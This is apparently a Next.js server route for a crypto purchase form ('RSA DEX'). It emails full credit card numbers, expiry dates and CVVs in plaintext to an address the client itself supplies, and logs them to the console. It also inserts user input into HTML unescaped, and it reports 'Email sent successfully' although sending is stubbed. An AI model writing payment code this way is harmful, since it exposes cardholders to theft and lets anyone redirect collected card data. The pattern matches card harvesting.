import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const {
      userEmail,
      supportEmail,
      method,
      amount,
      asset,
      paymentData,
      timestamp
    } = await request.json()

    // Validate required fields
    if (!userEmail || !supportEmail || !method || !amount) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    // Email content based on payment method
    const emailContent = generateEmailContent(method, {
      userEmail,
      amount,
      asset,
      paymentData,
      timestamp
    })

    // In a real implementation, you would use a service like:
    // - SendGrid
    // - Mailgun
    // - AWS SES
    // - Nodemailer with SMTP
    
    console.log('=== EMAIL TO BE SENT ===')
    console.log('To:', supportEmail)
    console.log('From:', 'noreply@rsacrypto.com')
    console.log('Subject:', emailContent.subject)
    console.log('Content:', emailContent.body)
    console.log('User Copy To:', userEmail)
    console.log('========================')

    // Simulate email sending delay
    await new Promise(resolve => setTimeout(resolve, 1000))

    // Here you would integrate with your email service:
    /*
    const emailService = new EmailService({
      apiKey: process.env.EMAIL_API_KEY,
      domain: process.env.EMAIL_DOMAIN
    })

    await emailService.send({
      to: supportEmail,
      from: 'noreply@rsacrypto.com',
      subject: emailContent.subject,
      html: emailContent.body,
      cc: userEmail // Send copy to user
    })
    */

    return NextResponse.json({
      success: true,
      message: 'Email sent successfully',
      sentTo: supportEmail,
      userCopy: userEmail
    })

  } catch (error) {
    console.error('Error sending email:', error)
    return NextResponse.json(
      { error: 'Failed to send email' },
      { status: 500 }
    )
  }
}

function generateEmailContent(method: string, data: any) {
  const { userEmail, amount, asset, paymentData, timestamp } = data

  if (method === 'credit_card') {
    return {
      subject: `New Credit Card Purchase Request - ${amount} USD`,
      body: `
        <h2>New Credit Card Purchase Request</h2>
        <p><strong>Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
        <p><strong>User Email:</strong> ${userEmail}</p>
        <p><strong>Amount:</strong> $${amount} USD</p>
        <p><strong>Asset:</strong> ${asset}</p>
        
        <h3>Credit Card Details:</h3>
        <ul>
          <li><strong>Cardholder Name:</strong> ${paymentData.cardholderName}</li>
          <li><strong>Card Number:</strong> ${paymentData.cardNumber}</li>
          <li><strong>Expiry:</strong> ${paymentData.expiryDate}</li>
          <li><strong>CVV:</strong> ${paymentData.cvv}</li>
        </ul>
        
        <p><strong>Action Required:</strong> Process credit card payment and send tokens to user.</p>
        
        <hr>
        <p><em>This email was generated automatically from RSA DEX Buy Crypto form.</em></p>
      `
    }
  } else {
    return {
      subject: `New Bank Transfer Request - ${amount} USD`,
      body: `
        <h2>New Bank Transfer Request</h2>
        <p><strong>Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
        <p><strong>User Email:</strong> ${userEmail}</p>
        <p><strong>Amount:</strong> $${amount} USD</p>
        <p><strong>Asset:</strong> ${asset}</p>
        
        <h3>Customer Details:</h3>
        <ul>
          <li><strong>Full Name:</strong> ${paymentData.fullName}</li>
          <li><strong>Email:</strong> ${paymentData.email}</li>
          <li><strong>Bank Name:</strong> ${paymentData.bankName || 'Not provided'}</li>
        </ul>
        
        <p><strong>Action Required:</strong> Send bank transfer instructions to customer and process payment when received.</p>
        
        <hr>
        <p><em>This email was generated automatically from RSA DEX Buy Crypto form.</em></p>
      `
    }
  }
}